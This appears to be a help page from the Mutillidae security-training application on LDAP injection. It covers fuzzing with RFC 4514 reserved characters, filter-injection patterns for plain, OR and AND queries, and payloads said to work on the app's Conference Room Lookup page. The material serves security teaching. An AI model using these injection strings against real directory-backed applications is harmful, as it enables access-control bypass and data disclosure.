<br/><br/>
<span class="report-header">Overview</span>
<br/><br/>
LDAP injection attempts to input
 snippets of LDAP script into an application that passes the input to an LDAP server.
 The attack takes advantage of the trust the LDAP server has in the application
The attack executes on the LDAP server using the application account
<br/><br/>
LDAP injection allows an attacker to bypass access controls on LDAP data stores. This may
result in data disclosure. Depending on how the application interprets the data extracted,
LDAP injection may result in authentication or authorization bypass or other
logical vulnerabilities.
<br/><br/>
<a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-play-icon-40-40.png" style="margin-right: 10px;" />Video Tutorials</a>
<br/><br/>
<span class="report-header">Discovery Methodology</span>
<br/><br/>
Ideally, attempt to fuzz input fields to cause error message. For example,
injection of "(" produces an error. Even if system does not display an explicit
message, injection may cause a change detectable with differential analysis
<ul>
	<li>Additional or missing output</li>
	<li>Failure to function as expected</li>
	<li>Faster or slower response times aka Time-Delay Inference</li>
</ul>
LDAP String reserved characters are defined in RFC 4514: String Representation of Distinguished Names
at www.ietf.org/rfc/rfc4514.txt. RFC 4514 states "The following characters need escaping". Therefore,
they make excellent values for fuzzing.
<ul>
	<li>Space (' ' U+0020)</li>
	<li>Number sign ('#' U+0023)</li>
	<li>Double-quote, plus, comma, semi-colon, less-than, greater-than, backslash</li>
	<li>Null (U+0000)</li>
</ul>
These characters can be placed into a file with the following Python code
<br/>
<code>
python -c 'for i in [0x20,0x23,0X22,0X2B,0X2C,0X3B,0X3C,0X3E,0x5C,0x00]:print(chr(i))' > /tmp/injections.txt
</code>
<br/><br/>
<span class="report-header">Exploitation</span>
<br/><br/>
Similar to SQL injection, there is no particular pattern that will work. It depends on
the code implemented by the application.
The correct injection to use may not be obvious.
Error message do not always disclose query or search logic.
Learning common design patterns helps know which injections might work. The following general patterns
apply to many applications.
<br/><br/>
If there is no logic operator (OR or AND), the bolded injections may work assuming they fit
into the assumed application code segments (non-bolded parts)
<br/>
<ul>
	<li>(attribute=<span class="label">*</span>)</li>
	<li>(attribute=<span class="label">value)(attribute2=*</span>)</li>
</ul>
If there is an "OR" logic operator, the bolded injections may work assuming they fit
into the assumed application code segments (non-bolded parts)
<br/>
<ul>
	<li>(|(attribute1=<span class="label">*</span>)(second_filter))</li>
	<li>(|(attribute=<span class="label">whatever)(attribute2=*</span>)(second_filter))</li>
	<li>(|(attribute=<span class="label">*)(attribute2=*))(&amp;(1=0</span>)(second_filter))</li>
</ul>
If there is an "AND" logic operator, the bolded injections may work assuming they fit
into the assumed application code segments (non-bolded parts)
<br/>
<ul>
	<li>(&amp;(attribute1=<span class="label">*</span>)(second_filter))</li>
	<li>(&amp;(attribute=<span class="label">whatever)(attribute2=*</span>)(second_filter))</li>
	<li>(&amp;(attribute=<span class="label">*)(attribute2=*))(&amp;(1=0</span>)(second_filter))</li>
</ul>
The following injections work in Mutillidae Conference Room Lookup page
<ul>
	<li>*</li>
	<li>value)(cn=*</li>
	<li>﻿*)(whatever=*)(&(1=0)(1=1)</li>
</ul>
<br/>
<span id="videos" class="report-header">Videos</span>
<br/><br/>
<br/><br/>